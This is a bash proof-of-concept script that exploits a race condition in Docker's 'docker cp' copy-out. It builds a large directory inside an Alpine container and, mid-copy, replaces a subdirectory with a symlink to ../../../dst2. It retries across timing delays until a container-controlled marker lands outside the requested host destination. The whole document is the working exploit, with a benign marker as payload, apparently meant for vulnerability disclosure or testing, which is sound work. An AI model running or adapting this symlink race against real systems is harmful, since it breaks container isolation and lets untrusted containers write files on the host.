#!/usr/bin/env bash
set -euo pipefail

name="docker-cp-copyout-poc-$$"
host_base="${HOST_BASE:-/tmp/docker-cp-copyout-poc-$$}"
host_dst="${host_base}/dst"
host_out="${host_base}/dst2"
attempt_log="${host_base}/attempts.log"
stdout_log="${host_base}/docker-cp.stdout"
stderr_log="${host_base}/docker-cp.stderr"

cleanup() {
  docker rm -f "$name" >/dev/null 2>&1 || true
}
trap cleanup EXIT

rm -rf "$host_base"
mkdir -p "$host_dst" "$host_out"

docker run -d --name "$name" alpine:3.21 sleep 600 >/dev/null
docker exec "$name" sh -lc '
  set -e
  rm -rf /tmp/src /dst2
  mkdir -p /tmp/src/dir /dst2
  printf "container-controlled-host-marker\n" > /dst2/marker
  i=0
  while [ "$i" -lt 12000 ]; do
    printf "pad-%05d-%0128d\n" "$i" 0 > "/tmp/src/dir/a$(printf "%05d" "$i")"
    i=$((i+1))
  done
  mkdir -p /tmp/src/dir/zzlink
'

try_delay() {
  local delay="$1"
  rm -rf "$host_dst" "$host_out"
  mkdir -p "$host_dst" "$host_out"
  : > "$stdout_log"
  : > "$stderr_log"
  docker exec "$name" sh -lc 'rm -rf /tmp/src/dir/zzlink /tmp/swap-done; mkdir -p /tmp/src/dir/zzlink'
  docker exec -d "$name" sh -lc "sleep '$delay'; rm -rf /tmp/src/dir/zzlink; ln -s ../../../dst2 /tmp/src/dir/zzlink; touch /tmp/swap-done"
  set +e
  docker cp "$name:/tmp/src" "$host_dst" >"$stdout_log" 2>"$stderr_log"
  local cp_status=$?
  set -e
  local outside="absent"
  if [ -f "$host_out/marker" ]; then
    outside="present"
  fi
  local link="absent"
  for candidate in "$host_dst/src/dir/zzlink" "$host_dst/dir/zzlink"; do
    if [ -L "$candidate" ]; then
      link="$(readlink "$candidate")"
      break
    elif [ -d "$candidate" ]; then
      link="directory"
    fi
  done
  printf 'delay=%s cp_status=%s outside_marker=%s link=%s\n' "$delay" "$cp_status" "$outside" "$link" | tee -a "$attempt_log"
  [ "$outside" = "present" ]
}

delays=(
  0.010 0.025 0.050 0.075 0.100 0.150 0.200 0.300 0.400 0.550
  0.700 0.900 1.100 1.400 1.800 2.200 2.800 3.500 4.500 5.500
)

success="no"
for delay in "${delays[@]}"; do
  if try_delay "$delay"; then
    success="yes"
    break
  fi
done

echo "success=${success}"
echo "host_base=${host_base}"
echo "requested_destination=${host_dst}"
echo "outside_marker_path=${host_out}/marker"
if [ "$success" = "yes" ]; then
  echo "outside_marker_value=$(cat "$host_out/marker")"
  for candidate in "$host_dst/src/dir/zzlink" "$host_dst/dir/zzlink"; do
    if [ -L "$candidate" ]; then
      echo "observed_symlink=${candidate} -> $(readlink "$candidate")"
      break
    fi
  done
  echo "docker_cp_stdout=${stdout_log}"
  echo "docker_cp_stderr=${stderr_log}"
else
  echo "attempt_log=${attempt_log}"
  echo "docker_cp_stderr_tail_start"
  tail -n 20 "$stderr_log" || true
  echo "docker_cp_stderr_tail_end"
  exit 1
fi
